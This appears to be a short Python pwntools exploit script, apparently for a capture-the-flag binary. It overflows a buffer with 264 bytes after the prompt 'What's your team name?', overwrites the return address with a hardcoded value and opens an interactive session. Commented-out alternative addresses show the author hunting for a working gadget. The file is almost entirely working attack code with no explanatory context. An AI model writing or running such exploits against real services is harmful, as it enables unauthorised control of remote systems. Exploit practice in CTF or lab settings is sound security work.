import sys
import logging
from pwn import *

logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)


if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")
    
else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

    ###address###

#ret_addr = 0x4002bc
#ret_addr = 0x40043e
#ret_addr = 0x400490
#ret_addr = 0x400490
#ret_addr = 0x4004cb          
#ret_addr = 0x4004ee
#ret_addr = 0x400591
#ret_addr = 0x40062f
#ret_addr = 0x4006c5
###
#ret_addr = 0x4023fa
#ret_addr = 0x402bca
ret_addr = 0x402dc6


    ###main###
def main():
    ###payload###
    payload = b"A" * 264
    payload += p64(ret_addr)
    payload += b"BBBB"
    
    _ = target.recvuntil("What's your team name?\n")
    print(_)
    target.sendline(payload)
    ret = target.recvline()
    print(ret)
        
    target.interactive()

if __name__ == "__main__":
    main()
